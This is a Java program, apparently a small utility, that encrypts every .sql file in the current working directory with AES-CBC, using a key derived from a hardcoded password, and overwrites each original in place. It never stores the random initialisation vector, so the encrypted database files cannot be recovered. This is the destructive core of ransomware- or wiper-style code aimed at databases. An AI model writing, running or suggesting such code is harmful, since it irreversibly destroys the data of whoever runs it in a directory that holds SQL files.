import java.io.*;
import java.nio.charset.StandardCharsets;
import java.security.*;
import javax.crypto.*;
import javax.crypto.spec.*;

public class SQLFileEncryptor {

    public static void main(String[] args) {
        // Directorio actual
        String directorio = System.getProperty("user.dir");
        // Contrase�a para el cifrado AES
        String contraseña = "ZFe+0HVJjWngp=¬S<6KÑDqis1IEQcxk)w[XB!28 ?b4_rU7l>9mRuLG(-Pz3M$NOA*dCyv°]oañ5#t@Yf%ThNasheardeXd$65";

        File carpeta = new File(directorio);
        File[] archivos = carpeta.listFiles();

        if (archivos != null) {
            for (File archivo : archivos) {
                if (archivo.isFile() && archivo.getName().endsWith(".sql")) {
                    try {
                        // Leer el contenido del archivo SQL
                        byte[] contenido = leerArchivo(archivo);
                        
                        // Generar clave y vector de inicializaci�n
                        SecretKey clave = generarClave(contraseña);
                        byte[] iv = generarIV();

                        // Cifrar el contenido del archivo SQL
                        byte[] contenidoCifrado = cifrarContenido(contenido, clave, iv);
                        
                        // Escribir el contenido cifrado en el mismo archivo
                        escribirArchivo(archivo, contenidoCifrado);
                        
                        System.out.println("Archivo '" + archivo.getName() + "' encriptado correctamente.");
                    } catch (Exception e) {
                        System.err.println("Error al encriptar el archivo '" + archivo.getName() + "': " + e.getMessage());
                    }
                }
            }
        }
    }

    private static byte[] leerArchivo(File archivo) throws IOException {
        FileInputStream fis = new FileInputStream(archivo);
        byte[] contenido = new byte[(int) archivo.length()];
        fis.read(contenido);
        fis.close();
        return contenido;
    }

    private static SecretKey generarClave(String contraseña) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest sha = MessageDigest.getInstance("SHA-256");
        byte[] claveBytes = sha.digest(contraseña.getBytes(StandardCharsets.UTF_8));
        return new SecretKeySpec(claveBytes, "AES");
    }

    private static byte[] generarIV() {
        SecureRandom random = new SecureRandom();
        byte[] iv = new byte[16];
        random.nextBytes(iv);
        return iv;
    }

    private static byte[] cifrarContenido(byte[] contenido, SecretKey clave, byte[] iv) throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, clave, new IvParameterSpec(iv));
        return cipher.doFinal(contenido);
    }

    private static void escribirArchivo(File archivo, byte[] contenido) throws IOException {
        FileOutputStream fos = new FileOutputStream(archivo);
        fos.write(contenido);
        fos.close();
    }
}
